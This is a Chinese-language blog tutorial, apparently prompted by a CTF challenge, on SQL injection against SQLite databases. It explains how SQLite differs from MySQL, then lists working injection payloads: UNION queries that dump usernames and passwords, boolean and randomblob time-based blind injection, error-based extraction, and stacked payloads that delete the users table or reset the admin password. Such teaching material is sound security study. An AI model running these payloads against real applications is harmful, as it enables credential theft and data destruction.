---
title: SQLite下的SQL注入
date: 2026-05-23
tags: [数据库]
categories: [Web安全] 
excerpt: SQLite下的SQL注入
---

# SQLite下的SQL注入

在极客大挑战复现的时候遇到了 SQLite 数据库的 SQL 注入，所以现在在此记录一下，也是扩展一下关于数据库的知识。

## SQLite 基础

SQLite 和 MySQL 的区别还是比较大的，由于架构设计、语法和内置函数的不同，所以 MySQL 的注入技巧在 SQLite 上大部分会失效。

下面是 MySQL 和 SQLite 的一些区别：

| 差异       | MySQL                                                        | SQLite                                                 | 注意点                                                       |
| ---------- | ------------------------------------------------------------ | ------------------------------------------------------ | ------------------------------------------------------------ |
| 数据库架构 | 客户端-服务器模式，有独立的服务进程                          | 嵌入式数据据库，整个数据库是一个独立文件               | 攻击 SQLite时，可能通过文件读取漏洞直接获取`.db`文件，而在 MySQL 中几乎不可能 |
| 元数据表   | 通过`information_schema`数据库查询所有表、列信息             | 使用`sqlite_master`表存储所有表结构信息                | 所有基于`information_schema`的语句都会失效                   |
| 多语句执行 | PHP等连接器默认不支持堆叠注入                                | 支持使用`;`执行多条SQL语句                             | SQLite的注入理论上危害更大，可以直接执行`INSERT/UPDATE/DELETE`等语句 |
| 盲注函数   | 常用`sleep()`或`benchmark()`制造时间延迟来判断条件           | 无`sleep()`函数，需要找替代方案                        | 所有基于`sleep()`的延时注入脚本和工具都无法直接使用          |
| 用户与权限 | 有完整的用户和权限系统，可高权限跨库操作或读写文件           | 无用户概念，其权限完全基于操作系统对文件的读写权限     | 无法使用`load_file`、`into outfile()`这类需要MySQL特定权限的函数 |
| 文件操作   | 拥有`FILE`权限时可使用`load_file()`和`into outfile()`读写文件 | 没有内置的文件读写函数，可通过附加数据库等方式间接操作 | 直接的读写文件操作无法执行                                   |

### SQLite简介

SQLite 是一个轻量级、无服务器、直接读写文件的数据库。它的架构是嵌入式，不是独立进程，而是一个链接到程序中的库，数据库就是一个文件，这点可以理解为C语言中 include 文件，一个程序`include`SQLite，就把 SQLite 中所有的函数声明都引入进来了。

由于 SQLite 是一个独立文件，所以 SQLite 没有用户验证，读写操作完全依赖于操作系统的权限。

SQLite 的列有推荐类型，但是也能在同一列中存不同类型，可以存数字，文本甚至是二进制数据，而 MySQL 的类型很严格。

SQLite 原生支持堆叠注入，注释一般支持`-- `和`/**/`。

### SQLite 基本语法与操作

#### 创建与打开数据库：就是操作一个文件

在 MySQL 中，我们要先连接服务器，然后`create database mydb;`，而在 SQLite 中，我们直接指定一个路径，若文件存在则打开，不存在则新建：`sqlite3 /.../mydb.db`。后续的操作都在这个文件里。

#### 数据类型

SQLite 有5种数据类型，但核心理念是**动态类型**，也就是说，我们可以把字符串放到设计为数字的列中。

| 存储类     | 说明                     |
| ---------- | ------------------------ |
| `NULL`     | 空值                     |
| `INTERGER` | 有符号整数               |
| `REAL`     | 浮点数                   |
| `TEXT`     | 文本字符串，用单引号包裹 |
| `BLOB`     | 二进制数据，原样存       |

**和 MySQL 的关键不同**：

- **无 `BOOLEAN`**：用整数 `0` (假) 和 `1` (真) 表示。
- **无 `DATETIME`**：通常用 `TEXT` 或 `INTEGER` 存日期。
- **`AUTOINCREMENT` 不同**：建表时写 `INTEGER PRIMARY KEY`，它就会自动成为自增主键，且复用 `rowid`。不需要特意声明。

#### 基本操作

和 MySQL 的差别不是很大，主要是语法细节和函数名。

##### 插入(INSERT)

```sqlite
INSERT INTO users (username, age, balance) VALUES ('张三', 25, 99.95);
```

##### 查询(SELECT)

```sqlite
-- 拿前10条
SELECT * FROM users LIMIT 10;

-- 跳过5条拿10条
SELECT * FROM users LIMIT 10 OFFSET 5;
```

**注：**如果要拼接字符串，SQLite 使用`||`，不是 MySQL 的`concat()`。

```sqlite
SELECT '用户名是：' || username FROM users;
```

##### 更新(UPDATE)

```sqlite
UPDATE users SET balance = 0.00 WHERE id = 1;
```

##### 删除(DELETE)

```sqlite
DELETE FROM users WHERE id = 1;
```

### 特殊的数据库：sqlite_master

SQLite 的元数据都存在`sqlite_master`这张表中，不像 MySQL 一样用的`information_schema`。想了解数据库中有什么，就查`sqlite_master`。

```sqlite
-- 查看所有用户建的表
SELECT name FROM sqlite_master WHERE type='table';

-- 查看创建 users 表时的完整 SQL 语句
SELECT sql FROM sqlite_master WHERE name='users';
```

SQLite 的`sqlite_master`表中有几个固定的字段：

| 字段名     | 说明                                                         |
| :--------- | :----------------------------------------------------------- |
| `type`     | 对象类型。只有这几种：`table`（表）、`index`（索引）、`view`（视图）、`trigger`（触发器）。 |
| `name`     | 你给这个对象起的名字，比如表名 `users`、索引名 `idx_username`。 |
| `tbl_name` | 对于索引，它显示这个索引属于哪张表。对于表或视图，它就等于 `name`。 |
| `rootpage` | 对象数据在数据库文件里的起始页号，日常查询基本不用。         |
| `sql`      | 创建这个对象时用的原始 SQL 语句。对于表，这里就是 `CREATE TABLE users (...)`。 |

### 常用内置函数

这些是日常查询和 SQL 注入时都会碰到的基本函数。

| 功能     | 函数举例                     | 说明                                   |
| :------- | :--------------------------- | :------------------------------------- |
| 文本操作 | `substr(str, start, length)` | 截取子串。**索引从 1 开始**，不是0。   |
|          | `length(str)`                | 字符串长度。                           |
|          | `hex(str)`, `unhex(hex_str)` | 转十六进制，盲注时常用。               |
| 聚合     | `count()`, `sum()`, `avg()`  | 和标准 SQL 一样。                      |
|          | `group_concat(column, ',')`  | **极常用**。把多行结果拼成一个字符串。 |
| 其他     | `randomblob(N)`              | 生成 N 字节的随机数据，盲注延时关键。  |
|          | `sqlite_version()`           | 返回版本号，探测数据库时用。           |
|          | `typeof(表达式)`             | 返回数据类型（integer/text）。         |

## SQLite 场景下的注入攻击方法

SQLite 的注入场景可按攻击目的和手法来分类，主要是这四种：联合查询、盲注、报错、堆叠，和 MySQL 场景下的 SQL 注入还是比较像的。

### 联合查询注入

这是最直接、最有效的方法，步骤和 MySQL 几乎一样，只是查询元数据的语句有所不同。由于 SQLite 只有一个数据库，所以可以少一个查询数据库的步骤。

#### 第一步：确定列数

```sqlite
' ORDER BY 3--     -- 不断改数字，直到报错，就知道列数了
' UNION SELECT 1,2,3--  -- 也可以直接用 UNION 测
```

#### 第二步：看哪些列有回显

假设测出3列，在页面上看到数字 `2` 和 `3` 回显了，那第1列就不可见。

#### 第三步：查数据库结构

这是和 MySQL 最大的区别——换成查 `sqlite_master`：

```sqlite
-- 查所有表名
' UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table'--

-- 查某张表的建表 SQL（包含所有列名）
' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE name='users'--
```

#### 第四步：窃取数据

知道表叫 `users`，列有 `username` 和 `password`，直接掏空：

```sqlite
' UNION SELECT 1, username || ':' || password, 3 FROM users--
```

`||` 是 SQLite 拼字符串的符号，可以把两个字段拼在一起，从一个回显位同时拿出来。

### 盲注

#### 布尔盲注

```sqlite
-- 猜 password 的第一个字符是不是 'a'（十六进制 61）
' AND (SELECT hex(substr(password,1,1)) FROM users LIMIT 1)='61'--
```

SQLite 的 `substr()` 索引**从 1 开始**，不是 0。

#### 时间盲注

SQLite 没有`sleep()`函数，需要自己创造延时。使用`randomblob()`让数据库做大量计算。

```sqlite
-- 如果条件成立，就生成一个 2 亿字节的随机 blob，造成明显延时
' AND (CASE WHEN (条件) THEN randomblob(200000000) ELSE 0 END)--
```

### 报错注入

#### 利用不存在的函数

```sqlite
' AND (SELECT 报错位置(sql) FROM sqlite_master LIMIT 1)--
```

`报错位置` 是一个不存在的函数名。SQLite 会先计算子查询 `(SELECT sql FROM ...)`，得到字符串，然后把字符串传给这个不存在的函数，最后报错。报错信息里就会显示子查询的结果。

#### 利用语法冲突

```sqlite
' AND 1=(SELECT sql FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0)--
```

这里的关键是制造**类型冲突**。左边是数字 `1`，右边子查询返回的是文本（建表语句），两者比较时报错，错误信息会显示文本内容。

### 堆叠注入

后端使用`sqlite3_exec()`一类能执行多条语句的函数，不做限制。

这是 SQLite 比 MySQL 更危险的地方——**它原生支持多语句执行**，PHP 的 PDO 默认也没限制。

```sqlite
'; DELETE FROM users; --
'; UPDATE users SET password='hacked' WHERE username='admin'; --
```

### SQLite 特殊技巧

#### 布尔注入加速：通配符猜解

不用一位一位猜，可以用 `LIKE` 和 `GLOB` 配合通配符快速逼近：

```sqlite
-- 猜密码是不是 'a%'
' AND (SELECT password FROM users LIMIT 1) LIKE 'a%'--
-- 猜密码第一个字符范围
' AND (SELECT password FROM users LIMIT 1) GLOB '[a-m]*'--
```

`GLOB` 是大小写敏感的，`[a-m]*` 表示 a 到 m 之间的字母开头。

####  串联所有数据：`group_concat()` 一把梭

拿到一个回显位就能吐出一整列：

```sqlite
' UNION SELECT 1, group_concat(username || ':' || password), 3 FROM users--
```























